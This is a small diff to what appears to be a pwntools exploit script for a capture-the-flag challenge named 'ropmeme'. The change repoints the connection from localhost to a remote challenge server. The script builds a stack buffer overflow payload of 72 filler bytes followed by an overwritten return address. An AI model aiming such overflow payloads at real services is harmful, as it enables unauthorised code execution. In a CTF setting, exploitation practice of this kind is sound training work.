@@ -3,7 +3,7 @@ from pwn import *
 
 context.log_level = 'DEBUG'
 #p = process("./ropmeme")
-p = remote("localhost", 5001)
+p = remote("ropmeme.dcctf.xyz", 80)
 
 junk = "A"*72
 payload = junk + p64(0x00401196)
